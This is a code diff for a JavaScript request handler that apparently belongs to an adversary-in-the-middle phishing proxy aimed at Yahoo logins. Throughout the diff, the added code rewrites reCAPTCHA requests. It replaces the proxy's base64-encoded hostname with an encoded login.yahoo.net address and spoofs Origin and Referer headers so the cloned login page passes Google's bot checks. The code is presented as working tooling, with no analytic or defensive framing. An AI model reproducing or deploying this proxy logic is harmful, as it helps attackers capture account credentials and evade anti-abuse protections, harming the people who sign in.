@@ -101,38 +101,9 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         super.loadAutoGrab(configExport.AUTOGRAB_CODE)
 
-
-        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
-            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
-            const hostnameBase64Key = hostnameKey.toString('base64');
-            console.log(hostnameBase64Key)
-
-            this.req.url = this.req.url.replace('..', '==')
-            this.req.url = this.req.url.replace('.&', '=&')
-
-            
-            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')
-
-            
-            console.log(this.req.url)
-            return super.superExecuteProxy('www.google.com', clientContext)
-
-
-        }
-
-
-        if (this.req.url.startsWith('/recaptcha/enterprise')) {
-            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
-            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''
-            
-            return super.superExecuteProxy('www.google.com', clientContext)
-
-        }
-
-        
-
-        const redirectToken = this.checkForRedirect()
+        const redirectToken = super.checkForRedirect()
         if (redirectToken !== null) {
+            console.log('redirect valid.........')
             console.log(JSON.stringify(redirectToken))
 
             const checkUrls = ["https://guce.yahoo.com", 
@@ -163,6 +134,43 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
 
+
+        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
+            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
+            const hostnameBase64Key = hostnameKey.toString('base64');
+            console.log(hostnameBase64Key)
+
+            this.req.url = this.req.url.replace('..', '==')
+            this.req.url = this.req.url.replace('.&', '=&')
+
+            
+            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')
+
+            
+            console.log(this.req.url)
+            return super.superExecuteProxy('www.google.com', clientContext)
+
+
+        }
+
+
+        if (this.req.url.startsWith('/recaptcha/enterprise')) {
+
+                this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
+                this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''
+                
+                return super.superExecuteProxy('www.google.com', clientContext)
+
+        }
+
+        
+
+       if (this.req.url.startsWith('/recaptcha/releases/')) {
+
+            this.req.headers['origin'] = 'https://login.yahoo.net'
+            this.req.headers['referer'] = 'https://login.yahoo.net'
+            return super.superExecuteProxy('www.gstatic.com', clientContext)
+       }
 
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
